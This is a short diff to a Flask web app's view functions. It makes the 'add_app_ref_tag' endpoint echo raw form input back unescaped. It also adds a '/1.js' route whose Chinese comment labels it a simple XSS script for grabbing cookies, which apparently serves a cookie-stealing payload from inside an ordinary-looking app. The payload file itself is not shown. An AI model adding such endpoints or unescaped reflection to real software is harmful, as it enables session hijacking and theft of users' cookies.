@@ -8,6 +8,7 @@ from flask import render_template, \
     request, \
     redirect, url_for
 from . import main
+# from manage import app as flaksapp
 
 from app.utils.crawl_utils import *
 
@@ -314,5 +315,12 @@ def add_fav():
 def add_app_ref_tag():
     q = request.form.get('apps')
     print 'q=' + q
-    # return q.encode('utf-8')
-    return render_template('500.html')
+    fav_apps = q.split('|')
+    print fav_apps[1:]
+    return q.encode('utf-8')
+
+
+# 简易版 xss 打cookie
+@main.route('/1.js')
+def xss():
+    return main.send_static_file('1.js')
